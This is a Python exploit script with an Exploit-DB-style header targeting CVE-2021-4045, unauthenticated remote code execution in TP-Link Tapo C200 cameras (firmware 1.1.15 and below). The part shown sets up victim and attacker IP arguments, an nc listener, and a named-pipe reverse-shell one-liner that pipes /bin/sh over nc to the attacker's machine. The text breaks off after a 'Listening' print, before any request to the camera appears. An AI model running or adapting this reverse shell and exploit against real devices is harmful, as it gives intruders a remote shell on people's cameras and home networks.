# Exploit Title: TP-Link Tapo c200 1.1.15 - Remote Code Execution (RCE)
# Date: 02/11/2022
# Exploit Author: hacefresko
# Vendor Homepage: https://www.tp-link.com/en/home-networking/cloud-camera/tapo-c200/
# Version: 1.1.15 and below
# Tested on: 1.1.11, 1.1.14 and 1.1.15
# CVE: CVE-2021-4045
# Write up of the vulnerability: <https://www.hacefresko.com/post/tp-link-tapo-c200-unauthenticated-rce>

import requests
import urllib3
import sys
import threading
import subprocess

# disable urllib3 warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set the port for reverse shell
PORT = 1337

# set the reverse shell command
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f'

# set the nc command to receive reverse shell (change it depending on your nc version)
NC_COMMAND = 'nc -lv {}'.format(PORT)

# check if the correct number of arguments are provided
if len(sys.argv) != 3:
    print("Usage: python3 pwnTapo.py <victim_ip> <attacker_ip>")
    exit()

# get victim and attacker IP addresses from command line arguments
victim = sys.argv[1]
attacker = sys.argv[2]

# print listening on port message
print(f"[+] Listening on {PORT}")

